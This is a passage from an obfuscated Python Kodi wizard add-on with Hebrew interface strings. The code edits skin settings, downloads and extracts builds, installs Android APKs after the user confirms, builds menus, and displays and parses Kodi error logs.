			OOO00000O0O0000OO =O00000O0OOOO0O000 .read ()#line:4310
			O00000O0OOOO0O000 .close ()#line:4311
			O000OOOO0O0O0O0O0 ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4312
			O0O00OO000OOO00OO =re .compile (O000OOOO0O0O0O0O0 ).findall (OOO00000O0O0000OO )[0 ]#line:4313
			O00000O0OOOO0O000 =open (O0OOOO0000OOOO000 ,'w')#line:4314
			O00000O0OOOO0O000 .write (OOO00000O0O0000OO .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%O0O00OO000OOO00OO ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4315
			O00000O0OOOO0O000 .close ()#line:4316
			O0OOOO0000OOOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4320
			O00000O0OOOO0O000 =open (O0OOOO0000OOOO000 ,'r')#line:4322
			OOO00000O0O0000OO =O00000O0OOOO0O000 .read ()#line:4323
			O00000O0OOOO0O000 .close ()#line:4324
			O000OOOO0O0O0O0O0 ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4325
			O0O00OO000OOO00OO =re .compile (O000OOOO0O0O0O0O0 ).findall (OOO00000O0O0000OO )[0 ]#line:4326
			O00000O0OOOO0O000 =open (O0OOOO0000OOOO000 ,'w')#line:4327
			O00000O0OOOO0O000 .write (OOO00000O0O0000OO .replace ('<setting id="show.cdart" type="bool%s/setting>'%O0O00OO000OOO00OO ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4328
			O00000O0OOOO0O000 .close ()#line:4329
			O0OOOO0000OOOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4333
			O00000O0OOOO0O000 =open (O0OOOO0000OOOO000 ,'r')#line:4335
			OOO00000O0O0000OO =O00000O0OOOO0O000 .read ()#line:4336
			O00000O0OOOO0O000 .close ()#line:4337
			O000OOOO0O0O0O0O0 ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4338
			O0O00OO000OOO00OO =re .compile (O000OOOO0O0O0O0O0 ).findall (OOO00000O0O0000OO )[0 ]#line:4339
			O00000O0OOOO0O000 =open (O0OOOO0000OOOO000 ,'w')#line:4340
			O00000O0OOOO0O000 .write (OOO00000O0O0000OO .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%O0O00OO000OOO00OO ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4341
			O00000O0OOOO0O000 .close ()#line:4342
		except :#line:4347
			pass #line:4348
def thirdPartyInstall (O000000000OOO00O0 ,OO00OO00O000O00OO ):#line:4350
	if not wiz .workingURL (OO00OO00O000O00OO ):#line:4351
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4352
	OOOO0OO00O0O00OO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000000000OOO00O0 ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4353
	if OOOO0OO00O0O00OO0 ==1 :#line:4354
		freshStart ('third',True )#line:4355
	wiz .clearS ('build')#line:4356
	O0O000OOOOO00O0O0 =O000000000OOO00O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4357
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4358
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000000000OOO00O0 ),'','אנא המתן')#line:4359
	OO0000000O0000O00 =os .path .join (PACKAGES ,'%s.zip'%O0O000OOOOO00O0O0 )#line:4360
	try :os .remove (OO0000000O0000O00 )#line:4361
	except :pass #line:4362
	downloader .download (OO00OO00O000O00OO ,OO0000000O0000O00 ,DP )#line:4363
	xbmc .sleep (1000 )#line:4364
	OOOOO0O00O0O0000O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000000000OOO00O0 )#line:4365
	DP .update (0 ,OOOOO0O00O0O0000O ,'','אנא המתן')#line:4366
	OOO0OOO0OOO00O0OO ,O00O00O0OOO0OOO0O ,O0O00OO000O0OO0O0 =extract .all (OO0000000O0000O00 ,HOME ,DP ,title =OOOOO0O00O0O0000O )#line:4367
	if int (float (OOO0OOO0OOO00O0OO ))>0 :#line:4368
		wiz .fixmetas ()#line:4369
		wiz .lookandFeelData ('save')#line:4370
		wiz .defaultSkin ()#line:4371
		wiz .setS ('installed','true')#line:4373
		wiz .setS ('extract',str (OOO0OOO0OOO00O0OO ))#line:4374
		wiz .setS ('errors',str (O00O00O0OOO0OOO0O ))#line:4375
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOO0OOO0OOO00O0OO ,O00O00O0OOO0OOO0O ))#line:4376
		try :os .remove (OO0000000O0000O00 )#line:4377
		except :pass #line:4378
		if int (float (O00O00O0OOO0OOO0O ))>0 :#line:4379
			OOOO0000OO000O000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000000000OOO00O0 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOO0OOO0OOO00O0OO ,'%',COLOR1 ,O00O00O0OOO0OOO0O ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4380
			if OOOO0000OO000O000 :#line:4381
				if isinstance (O00O00O0OOO0OOO0O ,unicode ):#line:4382
					O0O00OO000O0OO0O0 =O0O00OO000O0OO0O0 .encode ('utf-8')#line:4383
				wiz .TextBox (ADDONTITLE ,O0O00OO000O0OO0O0 )#line:4384
	DP .close ()#line:4385
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4386
	if INSTALLMETHOD ==1 :O0000O0O0O0OO0OOO =1 #line:4387
	elif INSTALLMETHOD ==2 :O0000O0O0O0OO0OOO =0 #line:4388
	else :O0000O0O0O0OO0OOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4389
	if O0000O0O0O0OO0OOO ==1 :wiz .reloadFix ()#line:4390
	else :wiz .killxbmc (True )#line:4391
def testTheme (OO0OO0O0O0OOO0000 ):#line:4393
	OO0OO0OOOOOOO0O0O =zipfile .ZipFile (OO0OO0O0O0OOO0000 )#line:4394
	for O00O0OO0000OOO00O in OO0OO0OOOOOOO0O0O .infolist ():#line:4395
		if '/settings.xml'in O00O0OO0000OOO00O .filename :#line:4396
			return True #line:4397
	return False #line:4398
def testGui (OOO00O000OO00OOO0 ):#line:4400
	O000OO0O00O0000OO =zipfile .ZipFile (OOO00O000OO00OOO0 )#line:4401
	for O0O0O00OOO00O0OO0 in O000OO0O00O0000OO .infolist ():#line:4402
		if '/guisettings.xml'in O0O0O00OOO00O0OO0 .filename :#line:4403
			return True #line:4404
	return False #line:4405
def apkInstaller (O0OOOO0OOOO000OOO ,OO0000O0OOOO00O00 ):#line:4407
	wiz .log (O0OOOO0OOOO000OOO )#line:4408
	wiz .log (OO0000O0OOOO00O00 )#line:4409
	if wiz .platform ()=='android':#line:4410
		O00O00OO0OO0OO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOOO0OOOO000OOO ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4411
		if not O00O00OO0OO0OO0OO :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4412
		O0OOOO0O0OOOO00O0 =O0OOOO0OOOO000OOO #line:4413
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4414
		if not wiz .workingURL (OO0000O0OOOO00O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4415
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOOO0O0OOOO00O0 ),'','אנא המתן')#line:4416
		O00OO0OO0OOO00OOO =os .path .join (PACKAGES ,"%s.apk"%O0OOOO0OOOO000OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4417
		try :os .remove (O00OO0OO0OOO00OOO )#line:4418
		except :pass #line:4419
		downloader .download (OO0000O0OOOO00O00 ,O00OO0OO0OOO00OOO ,DP )#line:4420
		xbmc .sleep (100 )#line:4421
		DP .close ()#line:4422
		notify .apkInstaller (O0OOOO0OOOO000OOO )#line:4423
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O00OO0OO0OOO00OOO +'")')#line:4424
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4425
def createMenu (O0OOO000OO00OOO0O ,OOO00O0OOO00O0OO0 ,OO00O0O0O0O00OO0O ):#line:4431
	if O0OOO000OO00OOO0O =='saveaddon':#line:4432
		O00O0O0O0O0OO00O0 =[]#line:4433
		O0O0OOOO000OO0O00 =urllib .quote_plus (OOO00O0OOO00O0OO0 .lower ().replace (' ',''))#line:4434
		O00OOOO0OOOO0OOOO =OOO00O0OOO00O0OO0 .replace ('Debrid','Real Debrid')#line:4435
		OO00OOO0O0OOO00O0 =urllib .quote_plus (OO00O0O0O0O00OO0O .lower ().replace (' ',''))#line:4436
		OO00O0O0O0O00OO0O =OO00O0O0O0O00OO0O .replace ('url','URL Resolver')#line:4437
		O00O0O0O0O0OO00O0 .append ((THEME2 %OO00O0O0O0O00OO0O .title (),' '))#line:4438
		O00O0O0O0O0OO00O0 .append ((THEME3 %'Save %s Data'%O00OOOO0OOOO0OOOO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0O0OOOO000OO0O00 ,OO00OOO0O0OOO00O0 )))#line:4439
		O00O0O0O0O0OO00O0 .append ((THEME3 %'Restore %s Data'%O00OOOO0OOOO0OOOO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0O0OOOO000OO0O00 ,OO00OOO0O0OOO00O0 )))#line:4440
		O00O0O0O0O0OO00O0 .append ((THEME3 %'Clear %s Data'%O00OOOO0OOOO0OOOO ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O0O0OOOO000OO0O00 ,OO00OOO0O0OOO00O0 )))#line:4441
	elif O0OOO000OO00OOO0O =='save':#line:4442
		O00O0O0O0O0OO00O0 =[]#line:4443
		O0O0OOOO000OO0O00 =urllib .quote_plus (OOO00O0OOO00O0OO0 .lower ().replace (' ',''))#line:4444
		O00OOOO0OOOO0OOOO =OOO00O0OOO00O0OO0 .replace ('Debrid','Real Debrid')#line:4445
		OO00OOO0O0OOO00O0 =urllib .quote_plus (OO00O0O0O0O00OO0O .lower ().replace (' ',''))#line:4446
		OO00O0O0O0O00OO0O =OO00O0O0O0O00OO0O .replace ('url','URL Resolver')#line:4447
		O00O0O0O0O0OO00O0 .append ((THEME2 %OO00O0O0O0O00OO0O .title (),' '))#line:4448
		O00O0O0O0O0OO00O0 .append ((THEME3 %'Register %s'%O00OOOO0OOOO0OOOO ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O0O0OOOO000OO0O00 ,OO00OOO0O0OOO00O0 )))#line:4449
		O00O0O0O0O0OO00O0 .append ((THEME3 %'Save %s Data'%O00OOOO0OOOO0OOOO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0O0OOOO000OO0O00 ,OO00OOO0O0OOO00O0 )))#line:4450
		O00O0O0O0O0OO00O0 .append ((THEME3 %'Restore %s Data'%O00OOOO0OOOO0OOOO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0O0OOOO000OO0O00 ,OO00OOO0O0OOO00O0 )))#line:4451
		O00O0O0O0O0OO00O0 .append ((THEME3 %'Import %s Data'%O00OOOO0OOOO0OOOO ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O0O0OOOO000OO0O00 ,OO00OOO0O0OOO00O0 )))#line:4452
		O00O0O0O0O0OO00O0 .append ((THEME3 %'Clear Addon %s Data'%O00OOOO0OOOO0OOOO ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O0O0OOOO000OO0O00 ,OO00OOO0O0OOO00O0 )))#line:4453
	elif O0OOO000OO00OOO0O =='install':#line:4454
		O00O0O0O0O0OO00O0 =[]#line:4455
		OO00OOO0O0OOO00O0 =urllib .quote_plus (OO00O0O0O0O00OO0O )#line:4456
		O00O0O0O0O0OO00O0 .append ((THEME2 %OO00O0O0O0O00OO0O ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OO00OOO0O0OOO00O0 )))#line:4457
		O00O0O0O0O0OO00O0 .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OO00OOO0O0OOO00O0 )))#line:4458
		O00O0O0O0O0OO00O0 .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OO00OOO0O0OOO00O0 )))#line:4459
		O00O0O0O0O0OO00O0 .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OO00OOO0O0OOO00O0 )))#line:4460
		O00O0O0O0O0OO00O0 .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OO00OOO0O0OOO00O0 )))#line:4461
	O00O0O0O0O0OO00O0 .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4462
	return O00O0O0O0O0OO00O0 #line:4463
def toggleCache (OOO0O000O0O0O00O0 ):#line:4465
	OOO0OO0O0000OOOOO =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4466
	OO0OOOO0O000O00O0 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4467
	if OOO0O000O0O0O00O0 in ['true','false']:#line:4468
		for OO0O0000O00000000 in OOO0OO0O0000OOOOO :#line:4469
			wiz .setS (OO0O0000O00000000 ,OOO0O000O0O0O00O0 )#line:4470
	else :#line:4471
		if not OOO0O000O0O0O00O0 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4472
			try :#line:4473
				OO0O0000O00000000 =OO0OOOO0O000O00O0 [OOO0OO0O0000OOOOO .index (OOO0O000O0O0O00O0 )]#line:4474
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OO0O0000O00000000 ))#line:4475
			except :#line:4476
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OOO0O000O0O0O00O0 ))#line:4477
		else :#line:4478
			OOOO0OOO0OO0O0OOO ='true'if wiz .getS (OOO0O000O0O0O00O0 )=='false'else 'false'#line:4479
			wiz .setS (OOO0O000O0O0O00O0 ,OOOO0OOO0OO0O0OOO )#line:4480
def playVideo (OOOOOO0OO00OOO0O0 ):#line:4482
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OOOOOO0OO00OOO0O0 )#line:4483
	if 'watch?v='in OOOOOO0OO00OOO0O0 :#line:4484
		OO00O0O0000000000 ,O000OOO00O0O0OO0O =OOOOOO0OO00OOO0O0 .split ('?')#line:4485
		OO0000OO0O00O000O =O000OOO00O0O0OO0O .split ('&')#line:4486
		for OOOO0O0OO000OOO00 in OO0000OO0O00O000O :#line:4487
			if OOOO0O0OO000OOO00 .startswith ('v='):#line:4488
				OOOOOO0OO00OOO0O0 =OOOO0O0OO000OOO00 [2 :]#line:4489
				break #line:4490
			else :continue #line:4491
	elif 'embed'in OOOOOO0OO00OOO0O0 or 'youtu.be'in OOOOOO0OO00OOO0O0 :#line:4492
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OOOOOO0OO00OOO0O0 )#line:4493
		OO00O0O0000000000 =OOOOOO0OO00OOO0O0 .split ('/')#line:4494
		if len (OO00O0O0000000000 [-1 ])>5 :#line:4495
			OOOOOO0OO00OOO0O0 =OO00O0O0000000000 [-1 ]#line:4496
		elif len (OO00O0O0000000000 [-2 ])>5 :#line:4497
			OOOOOO0OO00OOO0O0 =OO00O0O0000000000 [-2 ]#line:4498
	wiz .log ("YouTube URL: %s"%OOOOOO0OO00OOO0O0 )#line:4499
	yt .PlayVideo (OOOOOO0OO00OOO0O0 )#line:4500
def viewLogFile ():#line:4502
	OOOOO0O0O0OOO00OO =wiz .Grab_Log (True )#line:4503
	O0000O0OO0000OO00 =wiz .Grab_Log (True ,True )#line:4504
	O000OOOOO0OOOO000 =0 ;OOOOOOO00000O0000 =OOOOO0O0O0OOO00OO #line:4505
	if not O0000O0OO0000OO00 ==False and not OOOOO0O0O0OOO00OO ==False :#line:4506
		O000OOOOO0OOOO000 =DIALOG .select (ADDONTITLE ,["View %s"%OOOOO0O0O0OOO00OO .replace (LOG ,""),"View %s"%O0000O0OO0000OO00 .replace (LOG ,"")])#line:4507
		if O000OOOOO0OOOO000 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4508
	elif OOOOO0O0O0OOO00OO ==False and O0000O0OO0000OO00 ==False :#line:4509
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4510
		return #line:4511
	elif not OOOOO0O0O0OOO00OO ==False :O000OOOOO0OOOO000 =0 #line:4512
	elif not O0000O0OO0000OO00 ==False :O000OOOOO0OOOO000 =1 #line:4513
	OOOOOOO00000O0000 =OOOOO0O0O0OOO00OO if O000OOOOO0OOOO000 ==0 else O0000O0OO0000OO00 #line:4515
	O0O0O000000OOOOOO =wiz .Grab_Log (False )if O000OOOOO0OOOO000 ==0 else wiz .Grab_Log (False ,True )#line:4516
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OOOOOOO00000O0000 ),O0O0O000000OOOOOO )#line:4518
def errorChecking (log =None ,count =None ,all =None ):#line:4520
	if log ==None :#line:4521
		O000OO0O00O0OO000 =wiz .Grab_Log (True )#line:4522
		OOOO0O000O0O0OOO0 =wiz .Grab_Log (True ,True )#line:4523
		if not OOOO0O000O0O0OOO0 ==False and not O000OO0O00O0OO000 ==False :#line:4524
			O0OO0O0O00O000OO0 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O000OO0O00O0OO000 .replace (LOG ,""),errorChecking (O000OO0O00O0OO000 ,True ,True )),"View %s: %s error(s)"%(OOOO0O000O0O0OOO0 .replace (LOG ,""),errorChecking (OOOO0O000O0O0OOO0 ,True ,True ))])#line:4525
			if O0OO0O0O00O000OO0 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4526
		elif O000OO0O00O0OO000 ==False and OOOO0O000O0O0OOO0 ==False :#line:4527
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4528
			return #line:4529
		elif not O000OO0O00O0OO000 ==False :O0OO0O0O00O000OO0 =0 #line:4530
		elif not OOOO0O000O0O0OOO0 ==False :O0OO0O0O00O000OO0 =1 #line:4531
		log =O000OO0O00O0OO000 if O0OO0O0O00O000OO0 ==0 else OOOO0O000O0O0OOO0 #line:4532
	if log ==False :#line:4533
		if count ==None :#line:4534
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4535
			return False #line:4536
		else :#line:4537
			return 0 #line:4538
	else :#line:4539
		if os .path .exists (log ):#line:4540
			O00OOOOO0O000O000 =open (log ,mode ='r');O0OO0OO0O00O0O0OO =O00OOOOO0O000O000 .read ().replace ('\n','').replace ('\r','');O00OOOOO0O000O000 .close ()#line:4541
			OOO00O0OO0000OO00 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O0OO0OO0O00O0O0OO )#line:4542
			if not count ==None :#line:4543
				if all ==None :#line:4544
					O0O000OO000O0O0OO =0 #line:4545
					for OO0OOO0OOOOOOO0O0 in OOO00O0OO0000OO00 :#line:4546
						if ADDON_ID in OO0OOO0OOOOOOO0O0 :O0O000OO000O0O0OO +=1 #line:4547
					return O0O000OO000O0O0OO #line:4548
				else :return len (OOO00O0OO0000OO00 )#line:4549
			if len (OOO00O0OO0000OO00 )>0 :#line:4550
				O0O000OO000O0O0OO =0 ;OOOO0000OOOO000O0 =""#line:4551
				for OO0OOO0OOOOOOO0O0 in OOO00O0OO0000OO00 :#line:4552
					if all ==None and not ADDON_ID in OO0OOO0OOOOOOO0O0 :continue #line:4553
					else :#line:4554
						O0O000OO000O0O0OO +=1 #line:4555
						OOOO0000OOOO000O0 +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O0O000OO000O0O0OO ,OO0OOO0OOOOOOO0O0 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4556
				if O0O000OO000O0O0OO >0 :#line:4557
					wiz .TextBox (ADDONTITLE ,OOOO0000OOOO000O0 )#line:4558
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4559
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4560
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4561
ACTION_PREVIOUS_MENU =10 #line:4563
ACTION_NAV_BACK =92 #line:4564
ACTION_MOVE_LEFT =1 #line:4565
ACTION_MOVE_RIGHT =2 #line:4566
ACTION_MOVE_UP =3 #line:4567
ACTION_MOVE_DOWN =4 #line:4568
ACTION_MOUSE_WHEEL_UP =104 #line:4569
ACTION_MOUSE_WHEEL_DOWN =105 #line:4570
ACTION_MOVE_MOUSE =107 #line:4571
ACTION_SELECT_ITEM =7 #line:4572
ACTION_BACKSPACE =110 #line:4573
ACTION_MOUSE_LEFT_CLICK =100 #line:4574
ACTION_MOUSE_LONG_CLICK =108 #line:4575
def LogViewer (default =None ):#line:4577
	class OOO000OOOOO0OO00O (xbmcgui .WindowXMLDialog ):#line:4578
		def __init__ (O00OO0O00000O0OO0 ,*OO00000O0OOO0OOOO ,**O0OOO0O00O000O00O ):#line:4579
			O00OO0O00000O0OO0 .default =O0OOO0O00O000O00O ['default']#line:4580
		def onInit (OOO00OO0OOO000O00 ):#line:4582
			OOO00OO0OOO000O00 .title =101 #line:4583
			OOO00OO0OOO000O00 .msg =102 #line:4584
			OOO00OO0OOO000O00 .scrollbar =103 #line:4585
			OOO00OO0OOO000O00 .upload =201 #line:4586
			OOO00OO0OOO000O00 .kodi =202 #line:4587
			OOO00OO0OOO000O00 .kodiold =203 #line:4588
			OOO00OO0OOO000O00 .wizard =204 #line:4589
			OOO00OO0OOO000O00 .okbutton =205 #line:4590
			O000OO00O0OOOOO00 =open (OOO00OO0OOO000O00 .default ,'r')#line:4591
			OOO00OO0OOO000O00 .logmsg =O000OO00O0OOOOO00 .read ()#line:4592
			O000OO00O0OOOOO00 .close ()#line:4593
			OOO00OO0OOO000O00 .titlemsg ="%s: %s"%(ADDONTITLE ,OOO00OO0OOO000O00 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4594
			OOO00OO0OOO000O00 .showdialog ()#line:4595
		def showdialog (OOO0O0OOOOOO000OO ):#line:4597
			OOO0O0OOOOOO000OO .getControl (OOO0O0OOOOOO000OO .title ).setLabel (OOO0O0OOOOOO000OO .titlemsg )#line:4598
			OOO0O0OOOOOO000OO .getControl (OOO0O0OOOOOO000OO .msg ).setText (wiz .highlightText (OOO0O0OOOOOO000OO .logmsg ))#line:4599
			OOO0O0OOOOOO000OO .setFocusId (OOO0O0OOOOOO000OO .scrollbar )#line:4600
		def onClick (O00O0O0O0OOO0OO0O ,O0OOO00O00OO0O0O0 ):#line:4602
			if O0OOO00O00OO0O0O0 ==O00O0O0O0OOO0OO0O .okbutton :O00O0O0O0OOO0OO0O .close ()#line:4603
			elif O0OOO00O00OO0O0O0 ==O00O0O0O0OOO0OO0O .upload :O00O0O0O0OOO0OO0O .close ();uploadLog .Main ()#line:4604
			elif O0OOO00O00OO0O0O0 ==O00O0O0O0OOO0OO0O .kodi :#line:4605
				OOOOO0000O00OOO0O =wiz .Grab_Log (False )#line:4606
				OO0OO00OOO00OO0OO =wiz .Grab_Log (True )#line:4607
				if OOOOO0000O00OOO0O ==False :#line:4608
					O00O0O0O0OOO0OO0O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4609
					O00O0O0O0OOO0OO0O .getControl (O00O0O0O0OOO0OO0O .msg ).setText ("Log File Does Not Exists!")#line:4610
				else :#line:4611
					O00O0O0O0OOO0OO0O .titlemsg ="%s: %s"%(ADDONTITLE ,OO0OO00OOO00OO0OO .replace (LOG ,''))#line:4612
					O00O0O0O0OOO0OO0O .getControl (O00O0O0O0OOO0OO0O .title ).setLabel (O00O0O0O0OOO0OO0O .titlemsg )#line:4613
					O00O0O0O0OOO0OO0O .getControl (O00O0O0O0OOO0OO0O .msg ).setText (wiz .highlightText (OOOOO0000O00OOO0O ))#line:4614
					O00O0O0O0OOO0OO0O .setFocusId (O00O0O0O0OOO0OO0O .scrollbar )#line:4615
			elif O0OOO00O00OO0O0O0 ==O00O0O0O0OOO0OO0O .kodiold :#line:4616
				OOOOO0000O00OOO0O =wiz .Grab_Log (False ,True )#line:4617
				OO0OO00OOO00OO0OO =wiz .Grab_Log (True ,True )#line:4618
				if OOOOO0000O00OOO0O ==False :#line:4619
					O00O0O0O0OOO0OO0O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4620
					O00O0O0O0OOO0OO0O .getControl (O00O0O0O0OOO0OO0O .msg ).setText ("Log File Does Not Exists!")#line:4621
				else :#line:4622
					O00O0O0O0OOO0OO0O .titlemsg ="%s: %s"%(ADDONTITLE ,OO0OO00OOO00OO0OO .replace (LOG ,''))#line:4623
					O00O0O0O0OOO0OO0O .getControl (O00O0O0O0OOO0OO0O .title ).setLabel (O00O0O0O0OOO0OO0O .titlemsg )#line:4624
					O00O0O0O0OOO0OO0O .getControl (O00O0O0O0OOO0OO0O .msg ).setText (wiz .highlightText (OOOOO0000O00OOO0O ))#line:4625
					O00O0O0O0OOO0OO0O .setFocusId (O00O0O0O0OOO0OO0O .scrollbar )#line:4626
			elif O0OOO00O00OO0O0O0 ==O00O0O0O0OOO0OO0O .wizard :#line:4627
				OOOOO0000O00OOO0O =wiz .Grab_Log (False ,False ,True )#line:4628
				OO0OO00OOO00OO0OO =wiz .Grab_Log (True ,False ,True )#line:4629
				if OOOOO0000O00OOO0O ==False :#line:4630
					O00O0O0O0OOO0OO0O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4631
					O00O0O0O0OOO0OO0O .getControl (O00O0O0O0OOO0OO0O .msg ).setText ("Log File Does Not Exists!")#line:4632
				else :#line:4633
					O00O0O0O0OOO0OO0O .titlemsg ="%s: %s"%(ADDONTITLE ,OO0OO00OOO00OO0OO .replace (ADDONDATA ,''))#line:4634
					O00O0O0O0OOO0OO0O .getControl (O00O0O0O0OOO0OO0O .title ).setLabel (O00O0O0O0OOO0OO0O .titlemsg )#line:4635
					O00O0O0O0OOO0OO0O .getControl (O00O0O0O0OOO0OO0O .msg ).setText (wiz .highlightText (OOOOO0000O00OOO0O ))#line:4636
					O00O0O0O0OOO0OO0O .setFocusId (O00O0O0O0OOO0OO0O .scrollbar )#line:4637
		def onAction (OO0OOO00O0OO00OOO ,O00OOO0O00O0OOO0O ):#line:4639
